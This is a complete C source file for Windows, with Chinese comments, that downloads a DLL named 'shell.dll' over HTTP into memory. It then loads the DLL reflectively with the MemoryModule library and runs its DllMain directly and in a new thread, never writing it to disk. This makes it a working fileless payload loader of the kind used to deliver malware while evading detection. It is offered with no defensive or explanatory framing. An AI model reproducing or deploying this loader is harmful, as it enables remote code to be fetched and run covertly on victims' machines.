#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <Winhttp.h>
#include "MemoryModule.h"
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Winhttp.lib")

#define PAYLOAD_SIZE 1024*512
typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

typedef VOID(*msg)(VOID);
PBYTE bFileBuffer = NULL;

typedef struct _URL_INFO
{
	WCHAR szScheme[512];
	WCHAR szHostName[512];
	WCHAR szUserName[512];
	WCHAR szPassword[512];
	WCHAR szUrlPath[512];
	WCHAR szExtraInfo[512];
}URL_INFO, * PURL_INFO;


void download(const wchar_t* Url)
{
	URL_INFO url_info = { 0 };
	URL_COMPONENTSW lpUrlComponents = { 0 };
	lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
	lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo;
	lpUrlComponents.lpszHostName = url_info.szHostName;
	lpUrlComponents.lpszPassword = url_info.szPassword;
	lpUrlComponents.lpszScheme = url_info.szScheme;
	lpUrlComponents.lpszUrlPath = url_info.szUrlPath;
	lpUrlComponents.lpszUserName = url_info.szUserName;

	lpUrlComponents.dwExtraInfoLength =
		lpUrlComponents.dwHostNameLength =
		lpUrlComponents.dwPasswordLength =
		lpUrlComponents.dwSchemeLength =
		lpUrlComponents.dwUrlPathLength =
		lpUrlComponents.dwUserNameLength = 512;

	WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &lpUrlComponents);

	// 创建一个会话
	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
	DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;
	// 创建一个连接
	HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);
	// 创建一个请求，先查询内容的大小
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"HEAD", lpUrlComponents.lpszUrlPath, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentSize, &dwSizeDW, &dwIndex);
	WinHttpCloseHandle(hRequest);

	// 创建一个请求，获取数据
	hRequest = WinHttpOpenRequest(hConnect, L"GET", lpUrlComponents.lpszUrlPath, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	WinHttpReceiveResponse(hRequest, 0);

	// 一次性写入整个文件

	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
	do{
		WinHttpReadData(hRequest, bFileBuffer, dwContentSize, &dwReadBytes);
	} while (dwReadBytes == 0);


	
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);


}

int main()
{

	HMEMORYMODULE hModule;
	Module DllMain;
	bFileBuffer = new BYTE[PAYLOAD_SIZE];
	// 导入PE文件
	download(L"http://127.0.0.1/shell.dll");
	hModule = MemoryLoadLibrary(bFileBuffer);
	// 如果加载失败，就退出
	if (hModule == NULL) {
		delete[] bFileBuffer;
		printf("111");
	}
	// 获取msg导出函数地址
	DllMain = (Module)MemoryGetProcAddress(hModule, "DllMain");
	// 运行msg函数
	DllMain(0, 0, 0);
	// 释放资源
	DWORD dwThread;
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);
	// 释放PE内存
	delete[] bFileBuffer;
	return GetLastError();
}


